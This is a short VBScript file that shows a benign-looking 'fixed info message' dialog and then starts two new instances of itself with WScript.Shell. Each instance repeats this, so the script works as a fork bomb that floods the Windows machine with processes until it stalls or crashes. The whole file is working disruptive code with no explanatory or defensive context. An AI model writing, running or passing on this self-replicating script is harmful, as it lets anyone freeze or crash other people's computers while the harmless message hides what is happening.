MsgBox "This is a fixed info message.", vbOKOnly + vbInformation, "Info"

Set sh = CreateObject("WScript.Shell")
sh.Run "wscript """ & WScript.ScriptFullName & """"
sh.Run "wscript """ & WScript.ScriptFullName & """"
